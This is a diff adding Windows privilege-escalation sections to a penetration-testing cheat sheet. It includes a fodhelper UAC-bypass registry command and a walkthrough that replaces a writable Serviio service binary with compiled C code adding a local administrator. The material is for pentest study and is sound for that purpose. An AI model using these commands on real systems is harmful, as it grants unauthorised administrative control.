@@ -155,8 +155,11 @@ EasyG started out as a script that I use to automate some information gathering 
     - [Strategy](#strategy-1)
     - [Add new admin user](#add-new-admin-user)
     - [Generate a reverse shell](#generate-a-reverse-shell)
-    - [Kernel Exploits](#kernel-exploits)
-    - [Service Exploits](#service-exploits)
+    - [Kernel Exploits](#kernel-exploits-1)
+    - [Driver Exploits](#driver-exploits)
+    - [Service Exploits](#service-exploits-1)
+    - [User Account Control (UAC)](#user-account-control-uac)
+    - [Insecure File Permissions](#insecure-file-permissions)
     - [Registry](#registry)
     - [Passwords](#passwords)
     - [Scheduled Tasks](#scheduled-tasks)
@@ -3610,9 +3613,14 @@ Check also: [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articl
 #### <ins>Kernel Exploits</ins>
 
 1. Save the output of the `systeminfo` command: `systeminfo > systeminfo.txt`
+   - Try also the command: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
 2. Use it with Windows Exploit Suggester to find potential exploits: `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less`
    - See also: [Watson](https://github.com/rasta-mouse/Watson)
 3. See [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+#### <ins>Driver Exploits</ins>
+1. Enumerate the drivers that are installed on the system: `driverquery /v`
+2. Search in the Exploit Database
 
 #### <ins>Service Exploits</ins>
 
@@ -3657,6 +3665,53 @@ net start/stop <name>                            Start/Stop a service
 
 **DLL Hijacking**
 - See: [DLL Hijacking](#dll-hijacking)
+
+#### <ins>User Account Control (UAC)</ins>
+
+Example:
+- Even if we are logged in as an administrative user, we must move to a high integrity level in order to change the admin user's password.
+- To do it, run the following commands
+  ```PowerShell
+  <# spawn a cmd.exe process with high integrity #>
+  powershell.exe Start-Process cmd.exe -Verb runAs
+  
+  <# successfully changing the password of the admin user after spawning cmd.exe with high integrity #>
+  whoami /groups
+  net user admin Ev!lpass
+  ```
+  
+UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for managing language changes in the operating system. Runs as high integrity on `Windows 10 1709`
+- "[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"
+- "[UAC Bypass – Fodhelper](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)"
+- `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`
+
+
+#### <ins>Insecure File Permissions</ins>
+
+Exploit insecure file permissions on services that run as nt authority\system
+1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
+2. Notice services installed in the Program Files directory, this means that it's user-installed (for this example, Serviio)
+3. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
+   - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
+   - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
+4. Substitute `ServiioService.exe` with the following
+   ```C
+   #include <stdlib.h>
+   int main () {
+     int i;
+     i = system ("net user /add [username] [password]");
+     i = system ("net localgroup administrators [username] /add");
+     return 0;
+   }
+   ```
+   - `i686-w64-gcc adduser.c -o adduser.exe`
+   - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
+   - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
+   - `dir "C:\Program Files\Serviio\bin\"`
+5. Restart the service, here's two options
+   - `net stop Serviio`
+   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`. If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
+6. Check if it worked with `net localgroup Administrators`
 
 
 #### <ins>Registry</ins>
